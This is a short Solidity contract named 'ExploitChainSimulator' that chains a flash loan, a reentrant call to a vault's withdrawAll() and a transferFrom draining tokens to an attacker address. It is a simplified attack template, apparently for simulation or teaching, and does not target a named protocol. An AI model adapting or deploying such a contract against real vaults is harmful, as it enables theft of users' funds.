// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

/// @title ExploitChainSimulator - Orchestrates flash loan + reentrancy + logic bomb
interface IERC20 {
    function transferFrom(address, address, uint256) external returns (bool);
}

interface ILender {
    function flashLoan(uint256 amount) external;
}

contract ExploitChainSimulator {
    address public attacker;
    ILender public lender;
    address public vault;
    IERC20 public token;
    bool internal bombArmed;

    constructor(address _attacker, address _lender, address _token, address _vault) {
        attacker = _attacker;
        lender = ILender(_lender);
        token = IERC20(_token);
        vault = _vault;
    }

    function initiate() external {
        lender.flashLoan(1_000_000 ether); // Step 1: Flash Loan
    }

    // Step 2: Reentrancy via fallback trigger
    fallback() external {
        if (!bombArmed) {
            bombArmed = true;
            vault.call(abi.encodeWithSignature("withdrawAll()")); // Reentrant withdrawal
        } else {
            token.transferFrom(vault, attacker, 1_000_000 ether); // Step 3: Drain
        }
    }
}
